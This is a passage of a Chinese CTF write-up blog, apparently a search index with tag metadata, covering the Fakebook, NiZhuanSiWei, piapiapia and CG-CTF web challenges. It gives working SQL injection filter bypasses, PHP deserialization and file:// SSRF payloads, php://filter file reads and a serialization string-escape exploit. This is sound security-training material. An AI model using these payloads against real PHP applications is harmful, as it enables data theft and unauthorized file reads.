public 属性来绕过。 [网鼎杯 2018]Fakebook注册一个账号，点进去能看见自己的资料和博客内容。同时发现no=1，尝试注入。 sqlmap告诉我它可以注，但是没跑出来，手注。 12345678910no=1' //报错no=1 and 1=1 //正常,sql语句应该是 select ... from ... where id = nono=1 order by 4 //正常no=1 order by 5 //报错，有4列no=0 union select 1,2,3,4 //nohack 有过滤no=0/**/union/**/select/**/1,2,3,4 //用/**/绕过空格，发现2可以显示，同时知道了网站的绝对路径是/var/www/htmlno=0/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from/**/information_schema.schemata //查库，发现fakebookno=0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=%27fakebook%27 //查表，得到usersno=0/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=%27users%27 //查列，得到no,username,passwd,datano=0/**/union/**/select/**/1,group_concat(data),3,4/**/from/**/users //得到O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;A&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:5:&quot;a.com&quot;;}，一个序列化的用户信息 同时有两个信息 12Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31Fatal error: Call to a member function getBlogContents() on boolean in /var/www/html/view.php on line 67 猜测view.php把从数据库中查出的字符串反序列化后执行getBlogContents方法 看一下robots.php，发现有user.php.bak，知道了getBlogContents方法是调用curl_exec，curl_exec可以接受file://协议，于是最终payload 1no=0/**/union/**/select/**/1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:5;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' flag在iframe标签里 [ZJCTF 2019]NiZhuanSiWei第一步绕过text，可以使用data://或者php://input伪协议。第二步用php://filter读取useless.php，http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php，得到Flag类的结构。第三步读取flag.php，序列化一个Flag对象，用php://filter读flag。 12345678&lt;?phpclass Flag{ public $file; } $s = new Flag();$s-&gt;file='php://filter/read=convert.base64-encode/resource=flag.php';echo serialize($s);?&gt; 得到O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;} 最终payload 1http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;} [0CTF] 2016 piapiapia扫一下，发现www.zip，走一遍正常流程，注册，登录，更新资料，查看资料。 flag在config.php里，目的是要读到config.php，找一下能读文件的位置。 在profile.php找到file_get_contents($profile['photo']);，看一下能不能使$profile['photo']==’config.php‘，往上面找，profile来源于show_profile()反序列化，再看一下showprofile。 showprofile中，username经过过滤，无法注入（但过滤是很奇怪的），然后从数据库中查询到序列化的字符串，反序列化得到profile，再看看update_profile()。 updateprofile中，把username和newprofile过滤，其中newprofile是序列化后的表单内容，接下来重点看filter。 123456789public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} 进行了转义，如果发现 select, insert, update, delete, where会把它们变成hacker。对于profile来说，已经序列化的字符串长度时固定的，比如s:8:&quot;nickname&quot;;s:5:&quot;where&quot;，如果把where变成hacker，后面就变成s:5:&quot;hacker&quot;，反序列化时最后的引号就逃逸了。于是我们希望利用nickname这项来逃逸字符，使得最后的photo值为config.php。 nickname也有过滤 12if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); 可以用数组绕过。 正常序列化后的profile是 a:4:{s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;where&quot;;}s:5:&quot;photo&quot;;s:14:&quot;upload/somemd5&quot;;}，我们希望逃逸出的字符串是&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}，总共是34个字符，因此需要34个where，希望构成a:4:{s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} (后面还有一些)，这样where替换成hacker的时候后面的config.php就会赋值给photo 最后的payload，要在burp里面把nickname改成数组，内容是wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} ，在img的src里面能发现base64编码后的config.php，解码得到flag CG-CTFweb层层递进一直找iframe标签border那些都是0对应的文件，找到小故事，查看源代码的js文件名可以连成flag php decode看出题目是返回一个处理后的字符串，eval改为echo mysql看robots.txt，应该是要查询id=1024的内容，但是id==1024要得到false，利用intval，可以用1024e1，或者1024.1","link":"/2019/10/05/writeup/"}],"tags":[{"name":"vulnhub","slug":"vulnhub","link":"/tags/vulnhub/"},{"name":"渗透测试","slug":"渗透测试","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"flask","slug":"flask","link":"/tags/flask/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"tricks","slug":"tricks","link":"/tags/tricks/"},{"name":"metasploit","slug":"metasploit","link":"/tags/metasploit/"},{"name":"AI","slug":"AI","link":"/tags/AI/"},{"name":"tables","slug":"tables","link":"/tags/tables/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"Powershell","slug":"Powershell","link":"/tags/Powershell/"},{"name":"ssr","slug":"ssr","link":"/tags/ssr/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"}],"categories":[{"name":"vulnhub","slug":"vulnhub","link":"/categories/vulnhub/"},{"name":"python","slug":"python","link":"/categories/python/"},{"name":"metasploit","slug":"metasploit","link":"/categories/metasploit/"},{"name":"AI","slug":"AI","link":"/categories/AI/"},{"name":"notes","slug":"notes","link":"/categories/notes/"},{"name":"Powershell","slug":"Powershell","link":"/categories/Powershell/"},{"name":"漏洞复现","slug":"漏洞复现","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}]}